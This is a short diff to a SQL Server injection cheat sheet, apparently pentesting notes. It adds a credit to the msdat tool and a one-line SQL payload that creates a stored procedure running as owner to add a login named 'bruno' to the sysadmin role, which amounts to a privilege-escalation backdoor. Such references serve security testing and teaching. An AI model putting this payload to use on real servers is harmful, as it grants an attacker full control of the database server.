@@ -130,6 +130,14 @@ Result
 ```
 * Note: "JSON PATH" is frequently referenced, but it is most commonly used when constructing a query and you want to specify how the JSON output will be formatted.
 
+### Thoughts and Workflow made by msdat(https://github.com/quentinhardy/msdat)
+* 
+
+### Create a stored procedure in every databases
+```
+CREATE PROCEDURE IMDATELOHJOSUUSOOJAHMSAT WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'bruno','sysadmin'
+```
+
 ## Useful Queries
 
 ### Read localfile through errors
